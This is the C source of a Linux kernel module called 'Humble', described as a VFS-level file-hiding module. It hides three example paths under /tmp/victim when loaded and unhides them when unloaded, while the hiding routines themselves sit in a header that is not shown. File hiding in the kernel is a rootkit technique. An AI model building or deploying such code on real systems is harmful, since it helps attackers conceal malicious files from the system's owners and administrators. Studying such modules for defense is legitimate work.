#include <linux/types.h>
#include <linux/module.h>

#include "humble.h"

#define FILE_COUNT 3
static u64 g_inode[FILE_COUNT];
static char g_victim[FILE_COUNT][42] = {
	"/tmp/victim/example1",
	"/tmp/victim/example2",
	"/tmp/victim"
};

static int __init humble_init(void)
{
	int err;
	int i;
	printk(KERN_INFO "Humble: loaded");

	for (i = 0; i < FILE_COUNT; ++i) {
		err = humble_hide_file(g_victim[i], &g_inode[i]);
		if (err) {
			printk(KERN_ALERT "Humble: could not hide file\n");
			goto out;
		}
	}
out:
	return err;
}

static void __exit humble_exit(void)
{
	int err;
	int i;

	for (i = FILE_COUNT - 1; i >= 0; --i) {
		err = humble_unhide_file(g_inode[i]);
		if (err) {
			printk(KERN_ALERT "Humble: could not unhide file\n");
		}
	}
	printk(KERN_INFO "Humble: unloaded");
}

MODULE_AUTHOR("Alex Lozovsky");
MODULE_DESCRIPTION("Humble VFS-level filehiding module");
MODULE_LICENSE("GPL");

module_init(humble_init);
module_exit(humble_exit);
